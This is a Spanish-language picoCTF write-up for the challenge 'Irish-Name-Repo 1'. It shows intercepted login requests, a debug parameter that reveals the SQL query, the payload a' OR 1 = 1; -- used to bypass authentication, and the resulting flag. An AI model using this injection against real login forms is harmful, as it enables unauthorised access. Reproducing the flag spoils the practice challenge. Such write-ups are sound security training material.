---
title: Irish-Name-Repo 1
date: 2025-07-24 00:00:00 +0200
categories: [writeup, picoctf]
tags: [picoctf, explotación web, sql injection]     
image:
    path: https://picoctf.org/img/logos/pico-mark.svg
    alt: PicoCTF
---
>Irish-Name-Repo 1
Author: Chris Hensler
Description
There is a website running at https://jupiter.challenges.picoctf.org/problem/33850/ (link) or http://jupiter.challenges.picoctf.org:33850. Do you think you can log us in? Try to see if you can login!
{: .prompt-tip }

Este reto nos muestra una web con las imágenes de varias personas famosas. En el menú aparece un enlace a la página de login. 

Toca capturar el tráfico con Zap para ver que se envía a la web. 

``` html
POST https://jupiter.challenges.picoctf.org/problem/33850/login.php HTTP/1.1
Host: jupiter.challenges.picoctf.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Origin: https://jupiter.challenges.picoctf.org
Connection: keep-alive
Referer: https://jupiter.challenges.picoctf.org/problem/33850/login.html
Cookie: cf_clearance=1XojyBg86J9ZrlIHWugf6TgPWU7yp82jClJkkDqGeLE-1753303775-1.2.1.1-rH04zi_4QxFKrM8jX7vcVwTMAK9q6kmyyXMW4tjP6HN3EzwMNyDWyBL_FLYKw5uwVqsBDLZb7nIP28zqN0r4Q_tVen1JjyXYhYh8I9JkxvUKLaxYlKmASJnBdMcjWwFwrU4Na54MIM4ybQA1lfDHalfcWzkG2oaQ0i04PPiSXSochlQ4EbHujoGXlLAu4qVAdNqsrNJBxjmerm7y25x25GFv_ajQ3.JCF8Vwttw2aBM
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i

username=admin&password=admin&debug=0
```
La primera pista es el parámetro debug=0 , vamos a ponerlo a 1.

``` html 
username: admin
password: admin
SQL query: SELECT * FROM users WHERE name='admin' AND password='admin'

Login failed.
```
La respuesta en la web muestra la query, y un **Login failed** todo apunta a otra inyección SQL. 

Pruebo con la misma inyección que utilicé para otros retos [More SQLi](../picoctf-moresqli)
>a' OR 1 = 1; --

``` html
POST https://jupiter.challenges.picoctf.org/problem/33850/login.php HTTP/1.1
Host: jupiter.challenges.picoctf.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Content-Type: application/x-www-form-urlencoded
Content-Length: 53
Origin: https://jupiter.challenges.picoctf.org
Connection: keep-alive
Referer: https://jupiter.challenges.picoctf.org/problem/33850/login.html
Cookie: cf_clearance=1XojyBg86J9ZrlIHWugf6TgPWU7yp82jClJkkDqGeLE-1753303775-1.2.1.1-rH04zi_4QxFKrM8jX7vcVwTMAK9q6kmyyXMW4tjP6HN3EzwMNyDWyBL_FLYKw5uwVqsBDLZb7nIP28zqN0r4Q_tVen1JjyXYhYh8I9JkxvUKLaxYlKmASJnBdMcjWwFwrU4Na54MIM4ybQA1lfDHalfcWzkG2oaQ0i04PPiSXSochlQ4EbHujoGXlLAu4qVAdNqsrNJBxjmerm7y25x25GFv_ajQ3.JCF8Vwttw2aBM
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i

username=admin&password=a%27+OR+1+%3D+1%3B+--&debug=1
```
Parece que el campo password se encodea automáticamente. 
Altero el campo debug para que muestre la query en la web y despauso la captura para que se lance el requeste con el parámetro debug=1. 

``` html
username: admin
password: a' OR 1 = 1; --
SQL query: SELECT * FROM users WHERE name='admin' AND password='a' OR 1 = 1; --'

Logged in!

Your flag is: picoCTF{s0m3_SQL_f8adf3fb}
```
flag: **picoCTF{s0m3_SQL_f8adf3fb}**